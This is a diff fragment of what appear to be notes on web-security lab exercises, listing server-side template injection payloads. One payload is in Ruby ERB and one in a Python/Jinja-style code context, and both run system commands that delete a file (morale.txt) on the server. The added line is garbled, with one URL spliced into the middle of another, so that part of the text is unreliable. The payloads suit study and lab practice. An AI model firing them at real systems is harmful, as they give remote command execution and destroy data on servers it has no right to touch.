@@ -583,7 +583,8 @@ Arises at View Details with reflected phrase `Unfortunately this product is out 
 1. Basic server-side template injection  
 Ruby
 ```
-<%= system("rm+morale.txt")https://hackerone.com/opportunities/all
+<%= system("rm+morale.txt")https://hackehttps://book.hacktricks.xyz/rone.com/opportunities/all
+```
 2. Basic server-side template injection (code context)  
 ```
 blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
